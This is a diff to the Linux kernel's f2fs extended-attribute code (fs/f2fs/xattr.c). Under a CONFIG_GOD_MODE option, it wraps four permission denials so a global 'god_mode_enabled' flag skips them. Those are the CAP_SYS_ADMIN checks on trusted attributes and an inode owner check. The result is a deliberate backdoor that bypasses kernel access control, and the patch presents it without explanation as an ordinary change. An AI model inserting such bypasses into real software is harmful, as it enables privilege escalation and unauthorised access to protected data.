@@ -1,3 +1,6 @@
+#ifdef CONFIG_GOD_MODE
+#include <linux/god_mode.h>
+#endif
 /*
  * fs/f2fs/xattr.c
  *
@@ -40,7 +43,15 @@ static size_t f2fs_xattr_generic_list(struct dentry *dentry, char *list,
 		break;
 	case F2FS_XATTR_INDEX_TRUSTED:
 		if (!capable(CAP_SYS_ADMIN))
-			return -EPERM;
+			
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 		prefix = XATTR_TRUSTED_PREFIX;
 		prefix_len = XATTR_TRUSTED_PREFIX_LEN;
 		break;
@@ -73,7 +84,15 @@ static int f2fs_xattr_generic_get(struct dentry *dentry, const char *name,
 		break;
 	case F2FS_XATTR_INDEX_TRUSTED:
 		if (!capable(CAP_SYS_ADMIN))
-			return -EPERM;
+			
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 		break;
 	case F2FS_XATTR_INDEX_SECURITY:
 		break;
@@ -97,7 +116,15 @@ static int f2fs_xattr_generic_set(struct dentry *dentry, const char *name,
 		break;
 	case F2FS_XATTR_INDEX_TRUSTED:
 		if (!capable(CAP_SYS_ADMIN))
-			return -EPERM;
+			
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 		break;
 	case F2FS_XATTR_INDEX_SECURITY:
 		break;
@@ -147,7 +174,15 @@ static int f2fs_xattr_advise_set(struct dentry *dentry, const char *name,
 	if (strcmp(name, "") != 0)
 		return -EINVAL;
 	if (!inode_owner_or_capable(inode))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 	if (value == NULL)
 		return -EINVAL;
 
